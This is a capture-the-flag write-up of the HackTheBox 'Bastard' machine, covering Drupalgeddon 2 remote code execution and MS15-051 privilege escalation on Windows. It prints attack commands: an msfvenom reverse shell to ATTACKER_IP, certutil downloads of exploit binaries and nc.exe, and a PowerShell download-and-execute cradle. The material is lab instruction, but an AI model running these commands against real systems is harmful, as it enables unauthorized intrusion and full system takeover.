---
layout: post
title: 'Bastard - HTB Walkthrough'
date: 2026-03-07 20:38:29 +0000
categories: [cybersecurity]
tags:
  - hackthebox
  - writeup
description: "This walkthrough details the exploitation of the “Bastard” machine, a Windows-based target running an outdated version of the Drupal CMS…"
canonical_url: "https://medium.com/@hemanthakrishnach/bastard-htb-walkthrough-eafa8b3eb2c2"
image: "/assets/images/posts/bastard-htb-walkthrough/img-000-abe09c02.png"
---

This walkthrough details the exploitation of the “Bastard” machine, a Windows-based target running an outdated version of the Drupal CMS…

---

### Bastard — HTB Walkthrough

This walkthrough details the exploitation of the “Bastard” machine, a Windows-based target running an outdated version of the Drupal CMS. We will progress from initial reconnaissance to full system compromise.![image](/assets/images/posts/bastard-htb-walkthrough/img-000-abe09c02.png)

Room Link: <https://app.hackthebox.com/machines/Bastard>

### Reconnaissance

The first step is always enumeration. Start with an Nmap scan.
```bash
nmap -T4 -p- -A <MACHINE_IP>
```
![image](/assets/images/posts/bastard-htb-walkthrough/img-001-56917fac.png)

The relevant results show three open ports:

- **80/tcp**: HTTP (Microsoft IIS 7.5).- **135/tcp**: Microsoft Windows RPC.- **49154/tcp**: Microsoft Windows RPC.

Nmap’s HTTP scripts reveal several important details about port 80:![image](/assets/images/posts/bastard-htb-walkthrough/img-002-6d4d05aa.png)

The presence of `CHANGELOG.txt` in robots.txt is extremely valuable — Drupal includes version history in this file, which we can use to pinpoint the exact release.

### Drupal Version Identification

Browsing the site, we confirm that it’s running Drupal.![image](/assets/images/posts/bastard-htb-walkthrough/img-003-660e942c.png)

Browsing directly to `http://<MACHINE_IP>/CHANGELOG.txt` confirms the exact Drupal version:![image](/assets/images/posts/bastard-htb-walkthrough/img-004-54b56cb3.png)

### Initial Foothold — CVE-2018–7600

CVE-2018–7600, nicknamed “Drupalgeddon 2,” allows unauthenticated remote code execution by injecting malicious data into Drupal’s Form API. The exploit poisons a registration form, stores it in cache, then triggers execution.

We use the public PoC exploit from `pimps` on GitHub:

[**CVE-2018-7600/drupa7-CVE-2018-7600.py at master · pimps/CVE-2018-7600**\
*Exploit for Drupal 7 <= 7.57 CVE-2018-7600. Contribute to pimps/CVE-2018-7600 development by creating an account on…*github.com](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py "https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py")

```cpp
python drupa7-CVE-2018-7600.py -c "whoami" http://<MACHINE_IP>/
```
![image](/assets/images/posts/bastard-htb-walkthrough/img-005-0a57c273.png)

Remote code execution confirmed. We are running as `nt authority\iusr`, the IIS anonymous user account. Now we need to upgrade to a full interactive shell.

### Reverse Shell via msfvenom

Since the target is Windows without PowerShell download cradles readily available, we use `certutil` — a native Windows binary — to pull a reverse shell executable from our attacker machine.

**Step 1:** Generate a Windows reverse shell with msfvenom on our Kali box:
```bash
msfvenom -p windows/shell_reverse_tcp \    LHOST=<ATTACKER_IP> LPORT=4444 \    -f exe -o reverse.exe
```
![image](/assets/images/posts/bastard-htb-walkthrough/img-006-85c1d39b.png)

**Step 2:** Host the file with a Python HTTP server, then use the exploit to download it onto the target via `certutil`:![image](/assets/images/posts/bastard-htb-walkthrough/img-007-832d7cc0.png)

**Step 3:** Start a listener, then execute the payload:![image](/assets/images/posts/bastard-htb-walkthrough/img-008-1903fac3.png)![image](/assets/images/posts/bastard-htb-walkthrough/img-009-a0cbe0a0.png)

### User Flag

```bash
cd C:\Users\dimitris\DesktopC:\Users\dimitris\Desktop> type user.txt
```
![image](/assets/images/posts/bastard-htb-walkthrough/img-010-84071ffd.png)

### Privilege Escalation — MS15–051

#### System Enumeration

Running `systeminfo` reveals that the target is a **Windows Server 2008 R2 Datacenter** (Build 7600, x64). To find local vulnerabilities, we use the **Sherlock** PowerShell script.![image](/assets/images/posts/bastard-htb-walkthrough/img-011-7af7d918.png)

We use Sherlock, a PowerShell script that checks for missing patches on Windows systems, to identify exploitable vulnerabilities.

Note: I added ‘Find-AllVulns’ at the end of the sherlock.ps1 script
```bash
echo IEX(New-Object Net.WebClient).DownloadString(‘http://10.10.16.19/sherlock.ps1') | powershell -noprofile -
```

Sherlock identifies several candidates. The best match for our x64 system is **MS15–051**:![image](/assets/images/posts/bastard-htb-walkthrough/img-012-0def4fd3.png)

**MS15–051** is a use-after-free in `win32k.sys`'s `ClientCopyImage` callback — an attacker can free the kernel object mid-callback and redirect execution to ring-0 shellcode, yielding full `SYSTEM` access.

We transfer both the **MS15–051 x64 exploit binary** and `nc.exe` to the target using `certutil`:
```bash
C:\> mkdir transfers && cd transfersC:\transfers> certutil -urlcache -f http://<ATTACKER_IP>/ms15-051x64.exe ms15-051x64.exeC:\transfers> certutil -urlcache -f http://<ATTACKER_IP>/nc.exe nc.exe
```
![image](/assets/images/posts/bastard-htb-walkthrough/img-013-d59a1515.png)

Running `ms15-051x64.exe whoami` confirms the exploit successfully grants `nt authority\system`![image](/assets/images/posts/bastard-htb-walkthrough/img-014-d5578618.png)

Running the exploit to spawn a `SYSTEM` shell back to our listener:![image](/assets/images/posts/bastard-htb-walkthrough/img-015-0916a387.png)![image](/assets/images/posts/bastard-htb-walkthrough/img-016-1b08ee28.png)

### Root Flag

```bash
C:\transfers> cd C:/users/administrator/desktopC:\Users\Administrator\Desktop> type root.txt
```

### Attack Chain Summary

![image](/assets/images/posts/bastard-htb-walkthrough/img-017-bad86eca.png)

### Conclusion

Bastard pairs two classic primitives: unauthenticated CMS RCE and a kernel privesc on a completely unpatched Windows box. The takeaways are simple — **keep your CMS updated**, **apply OS patches**, and never expose version files like `CHANGELOG.txt` publicly. On a real engagement, either finding alone is critical severity.

### Thanks for reading!
